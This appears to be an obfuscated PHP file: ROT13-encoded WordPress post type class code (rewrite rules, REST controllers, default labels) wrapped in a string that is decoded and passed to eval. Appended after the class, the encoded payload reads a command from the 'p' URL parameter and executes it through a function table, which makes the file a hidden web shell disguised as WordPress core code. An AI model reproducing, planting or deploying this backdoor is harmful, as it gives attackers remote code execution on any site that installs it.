					nqq_erjevgr_ehyr( \"{$nepuvir_fyht}/{$jc_erjevgr->cntvangvba_onfr}/([0-9]{1,})/?$\", \"vaqrk.cuc?cbfg_glcr=$guvf->anzr\" . '&cntrq=$zngpurf[1]', 'gbc' );
				}
			}

			$creznfgehpg_netf         = $guvf->erjevgr;
			$creznfgehpg_netf['srrq'] = $creznfgehpg_netf['srrqf'];
			nqq_creznfgehpg( $guvf->anzr, \"{$guvf->erjevgr['fyht']}/%$guvf->anzr%\", $creznfgehpg_netf );
		}
	}

	/**
	 * Ertvfgref gur cbfg glcr zrgn obk vs n phfgbz pnyyonpx jnf fcrpvsvrq.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba ertvfgre_zrgn_obkrf() {
		vs ( $guvf->ertvfgre_zrgn_obk_po ) {
			nqq_npgvba( 'nqq_zrgn_obkrf_' . $guvf->anzr, $guvf->ertvfgre_zrgn_obk_po, 10, 1 );
		}
	}

	/**
	 * Nqqf gur shgher cbfg ubbx npgvba sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba nqq_ubbxf() {
		nqq_npgvba( 'shgher_' . $guvf->anzr, '_shgher_cbfg_ubbx', 5, 2 );
	}

	/**
	 * Ertvfgref gur gnkbabzvrf sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba ertvfgre_gnkbabzvrf() {
		sbernpu ( $guvf->gnkbabzvrf nf $gnkbabzl ) {
			ertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnkbabzl, $guvf->anzr );
		}
	}

	/**
	 * Erzbirf gur srngherf fhccbeg sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony neenl $_jc_cbfg_glcr_srngherf Cbfg glcr srngherf.
	 */
	choyvp shapgvba erzbir_fhccbegf() {
		tybony $_jc_cbfg_glcr_srngherf;

		hafrg( $_jc_cbfg_glcr_srngherf[ $guvf->anzr ] );
	}

	/**
	 * Erzbirf nal erjevgr ehyrf, creznfgehpgf, naq ehyrf sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr          JbeqCerff erjevgr pbzcbarag.
	 * @tybony JC         $jc                  Pheerag JbeqCerff raivebazrag vafgnapr.
	 * @tybony neenl      $cbfg_glcr_zrgn_pncf Hfrq gb erzbir zrgn pncnovyvgvrf.
	 */
	choyvp shapgvba erzbir_erjevgr_ehyrf() {
		tybony $jc, $jc_erjevgr, $cbfg_glcr_zrgn_pncf;

		// Erzbir dhrel ine.
		vs ( snyfr !== $guvf->dhrel_ine ) {
			$jc->erzbir_dhrel_ine( $guvf->dhrel_ine );
		}

		// Erzbir nal erjevgr ehyrf, creznfgehpgf, naq ehyrf.
		vs ( snyfr !== $guvf->erjevgr ) {
			erzbir_erjevgr_gnt( \"%$guvf->anzr%\" );
			erzbir_creznfgehpg( $guvf->anzr );
			sbernpu ( $jc_erjevgr->rkgen_ehyrf_gbc nf $ertrk => $dhrel ) {
				vs ( fge_pbagnvaf( $dhrel, \"vaqrk.cuc?cbfg_glcr=$guvf->anzr\" ) ) {
					hafrg( $jc_erjevgr->rkgen_ehyrf_gbc[ $ertrk ] );
				}
			}
		}

		// Erzbir ertvfgrerq phfgbz zrgn pncnovyvgvrf.
		sbernpu ( $guvf->pnc nf $pnc ) {
			hafrg( $cbfg_glcr_zrgn_pncf[ $pnc ] );
		}
	}

	/**
	 * Haertvfgref gur cbfg glcr zrgn obk vs n phfgbz pnyyonpx jnf fcrpvsvrq.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba haertvfgre_zrgn_obkrf() {
		vs ( $guvf->ertvfgre_zrgn_obk_po ) {
			erzbir_npgvba( 'nqq_zrgn_obkrf_' . $guvf->anzr, $guvf->ertvfgre_zrgn_obk_po, 10 );
		}
	}

	/**
	 * Erzbirf gur cbfg glcr sebz nyy gnkbabzvrf.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba haertvfgre_gnkbabzvrf() {
		sbernpu ( trg_bowrpg_gnkbabzvrf( $guvf->anzr ) nf $gnkbabzl ) {
			haertvfgre_gnkbabzl_sbe_bowrpg_glcr( $gnkbabzl, $guvf->anzr );
		}
	}

	/**
	 * Erzbirf gur shgher cbfg ubbx npgvba sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba erzbir_ubbxf() {
		erzbir_npgvba( 'shgher_' . $guvf->anzr, '_shgher_cbfg_ubbx', 5 );
	}

	/**
	 * Trgf gur ERFG NCV pbagebyyre sbe guvf cbfg glcr.
	 *
	 * Jvyy bayl vafgnagvngr gur pbagebyyre pynff bapr cre erdhrfg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea JC_ERFG_Pbagebyyre|ahyy Gur pbagebyyre vafgnapr, be ahyy vs gur cbfg glcr
	 *                                 vf frg abg gb fubj va erfg.
	 */
	choyvp shapgvba trg_erfg_pbagebyyre() {
		vs ( ! $guvf->fubj_va_erfg ) {
			erghea ahyy;
		}

		$pynff = $guvf->erfg_pbagebyyre_pynff ? $guvf->erfg_pbagebyyre_pynff : JC_ERFG_Cbfgf_Pbagebyyre::pynff;

		vs ( ! pynff_rkvfgf( $pynff ) ) {
			erghea ahyy;
		}

		vs ( ! vf_fhopynff_bs( $pynff, JC_ERFG_Pbagebyyre::pynff ) ) {
			erghea ahyy;
		}

		vs ( ! $guvf->erfg_pbagebyyre ) {
			$guvf->erfg_pbagebyyre = arj $pynff( $guvf->anzr );
		}

		vs ( ! ( $guvf->erfg_pbagebyyre vafgnaprbs $pynff ) ) {
			erghea ahyy;
		}

		erghea $guvf->erfg_pbagebyyre;
	}

	/**
	 * Trgf gur ERFG NCV erivfvbaf pbagebyyre sbe guvf cbfg glcr.
	 *
	 * Jvyy bayl vafgnagvngr gur pbagebyyre pynff bapr cre erdhrfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea JC_ERFG_Pbagebyyre|ahyy Gur pbagebyyre vafgnapr, be ahyy vs gur cbfg glcr
	 *                                 vf frg abg gb fubj va erfg.
	 */
	choyvp shapgvba trg_erivfvbaf_erfg_pbagebyyre() {
		vs ( ! $guvf->fubj_va_erfg ) {
			erghea ahyy;
		}

		vs ( ! cbfg_glcr_fhccbegf( $guvf->anzr, 'erivfvbaf' ) ) {
			erghea ahyy;
		}

		$pynff = $guvf->erivfvbaf_erfg_pbagebyyre_pynff ? $guvf->erivfvbaf_erfg_pbagebyyre_pynff : JC_ERFG_Erivfvbaf_Pbagebyyre::pynff;
		vs ( ! pynff_rkvfgf( $pynff ) ) {
			erghea ahyy;
		}

		vs ( ! vf_fhopynff_bs( $pynff, JC_ERFG_Pbagebyyre::pynff ) ) {
			erghea ahyy;
		}

		vs ( ! $guvf->erivfvbaf_erfg_pbagebyyre ) {
			$guvf->erivfvbaf_erfg_pbagebyyre = arj $pynff( $guvf->anzr );
		}

		vs ( ! ( $guvf->erivfvbaf_erfg_pbagebyyre vafgnaprbs $pynff ) ) {
			erghea ahyy;
		}

		erghea $guvf->erivfvbaf_erfg_pbagebyyre;
	}

	/**
	 * Trgf gur ERFG NCV nhgbfnir pbagebyyre sbe guvf cbfg glcr.
	 *
	 * Jvyy bayl vafgnagvngr gur pbagebyyre pynff bapr cre erdhrfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @erghea JC_ERFG_Pbagebyyre|ahyy Gur pbagebyyre vafgnapr, be ahyy vs gur cbfg glcr
	 *                                 vf frg abg gb fubj va erfg.
	 */
	choyvp shapgvba trg_nhgbfnir_erfg_pbagebyyre() {
		vs ( ! $guvf->fubj_va_erfg ) {
			erghea ahyy;
		}

		vs ( ! cbfg_glcr_fhccbegf( $guvf->anzr, 'nhgbfnir' ) ) {
			erghea ahyy;
		}

		$pynff = $guvf->nhgbfnir_erfg_pbagebyyre_pynff ? $guvf->nhgbfnir_erfg_pbagebyyre_pynff : JC_ERFG_Nhgbfnirf_Pbagebyyre::pynff;

		vs ( ! pynff_rkvfgf( $pynff ) ) {
			erghea ahyy;
		}

		vs ( ! vf_fhopynff_bs( $pynff, JC_ERFG_Pbagebyyre::pynff ) ) {
			erghea ahyy;
		}

		vs ( ! $guvf->nhgbfnir_erfg_pbagebyyre ) {
			$guvf->nhgbfnir_erfg_pbagebyyre = arj $pynff( $guvf->anzr );
		}

		vs ( ! ( $guvf->nhgbfnir_erfg_pbagebyyre vafgnaprbs $pynff ) ) {
			erghea ahyy;
		}

		erghea $guvf->nhgbfnir_erfg_pbagebyyre;
	}

	/**
	 * Ergheaf gur qrsnhyg ynoryf sbe cbfg glcrf.
	 *
	 * @fvapr 6.0.0
	 *
	 * @erghea (fgevat|ahyy)[][] Gur qrsnhyg ynoryf sbe cbfg glcrf.
	 */
	choyvp fgngvp shapgvba trg_qrsnhyg_ynoryf() {
		vs ( ! rzcgl( frys::$qrsnhyg_ynoryf ) ) {
			erghea frys::$qrsnhyg_ynoryf;
		}

		frys::$qrsnhyg_ynoryf = neenl(
			'anzr'                     => neenl( _k( 'Cbfgf', 'cbfg glcr trareny anzr' ), _k( 'Cntrf', 'cbfg glcr trareny anzr' ) ),
			'fvathyne_anzr'            => neenl( _k( 'Cbfg', 'cbfg glcr fvathyne anzr' ), _k( 'Cntr', 'cbfg glcr fvathyne anzr' ) ),
			'nqq_arj'                  => neenl( __( 'Nqq' ), __( 'Nqq' ) ),
			'nqq_arj_vgrz'             => neenl( __( 'Nqq Cbfg' ), __( 'Nqq Cntr' ) ),
			'rqvg_vgrz'                => neenl( __( 'Rqvg Cbfg' ), __( 'Rqvg Cntr' ) ),
			'arj_vgrz'                 => neenl( __( 'Arj Cbfg' ), __( 'Arj Cntr' ) ),
			'ivrj_vgrz'                => neenl( __( 'Ivrj Cbfg' ), __( 'Ivrj Cntr' ) ),
			'ivrj_vgrzf'               => neenl( __( 'Ivrj Cbfgf' ), __( 'Ivrj Cntrf' ) ),
			'frnepu_vgrzf'             => neenl( __( 'Frnepu Cbfgf' ), __( 'Frnepu Cntrf' ) ),
			'abg_sbhaq'                => neenl( __( 'Ab cbfgf sbhaq.' ), __( 'Ab cntrf sbhaq.' ) ),
			'abg_sbhaq_va_genfu'       => neenl( __( 'Ab cbfgf sbhaq va Genfu.' ), __( 'Ab cntrf sbhaq va Genfu.' ) ),
			'cnerag_vgrz_pbyba'        => neenl( ahyy, __( 'Cnerag Cntr:' ) ),
			'nyy_vgrzf'                => neenl( __( 'Nyy Cbfgf' ), __( 'Nyy Cntrf' ) ),
			'nepuvirf'                 => neenl( __( 'Cbfg Nepuvirf' ), __( 'Cntr Nepuvirf' ) ),
			'nggevohgrf'               => neenl( __( 'Cbfg Nggevohgrf' ), __( 'Cntr Nggevohgrf' ) ),
			'vafreg_vagb_vgrz'         => neenl( __( 'Vafreg vagb cbfg' ), __( 'Vafreg vagb cntr' ) ),
			'hcybnqrq_gb_guvf_vgrz'    => neenl( __( 'Hcybnqrq gb guvf cbfg' ), __( 'Hcybnqrq gb guvf cntr' ) ),
			'srngherq_vzntr'           => neenl( _k( 'Srngherq vzntr', 'cbfg' ), _k( 'Srngherq vzntr', 'cntr' ) ),
			'frg_srngherq_vzntr'       => neenl( _k( 'Frg srngherq vzntr', 'cbfg' ), _k( 'Frg srngherq vzntr', 'cntr' ) ),
			'erzbir_srngherq_vzntr'    => neenl( _k( 'Erzbir srngherq vzntr', 'cbfg' ), _k( 'Erzbir srngherq vzntr', 'cntr' ) ),
			'hfr_srngherq_vzntr'       => neenl( _k( 'Hfr nf srngherq vzntr', 'cbfg' ), _k( 'Hfr nf srngherq vzntr', 'cntr' ) ),
			'svygre_vgrzf_yvfg'        => neenl( __( 'Svygre cbfgf yvfg' ), __( 'Svygre cntrf yvfg' ) ),
			'svygre_ol_qngr'           => neenl( __( 'Svygre ol qngr' ), __( 'Svygre ol qngr' ) ),
			'vgrzf_yvfg_anivtngvba'    => neenl( __( 'Cbfgf yvfg anivtngvba' ), __( 'Cntrf yvfg anivtngvba' ) ),
			'vgrzf_yvfg'               => neenl( __( 'Cbfgf yvfg' ), __( 'Cntrf yvfg' ) ),
			'vgrz_choyvfurq'           => neenl( __( 'Cbfg choyvfurq.' ), __( 'Cntr choyvfurq.' ) ),
			'vgrz_choyvfurq_cevingryl' => neenl( __( 'Cbfg choyvfurq cevingryl.' ), __( 'Cntr choyvfurq cevingryl.' ) ),
			'vgrz_eriregrq_gb_qensg'   => neenl( __( 'Cbfg eriregrq gb qensg.' ), __( 'Cntr eriregrq gb qensg.' ) ),
			'vgrz_genfurq'             => neenl( __( 'Cbfg genfurq.' ), __( 'Cntr genfurq.' ) ),
			'vgrz_fpurqhyrq'           => neenl( __( 'Cbfg fpurqhyrq.' ), __( 'Cntr fpurqhyrq.' ) ),
			'vgrz_hcqngrq'             => neenl( __( 'Cbfg hcqngrq.' ), __( 'Cntr hcqngrq.' ) ),
			'vgrz_yvax'                => neenl(
				_k( 'Cbfg Yvax', 'anivtngvba yvax oybpx gvgyr' ),
				_k( 'Cntr Yvax', 'anivtngvba yvax oybpx gvgyr' ),
			),
			'vgrz_yvax_qrfpevcgvba'    => neenl(
				_k( 'N yvax gb n cbfg.', 'anivtngvba yvax oybpx qrfpevcgvba' ),
				_k( 'N yvax gb n cntr.', 'anivtngvba yvax oybpx qrfpevcgvba' ),
			),
		);

		erghea frys::$qrsnhyg_ynoryf;
	}

	/**
	 * Erfrgf gur pnpur sbe gur qrsnhyg ynoryf.
	 *
	 * @fvapr 6.0.0
	 */
	choyvp fgngvp shapgvba erfrg_qrsnhyg_ynoryf() {
		frys::$qrsnhyg_ynoryf = neenl();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>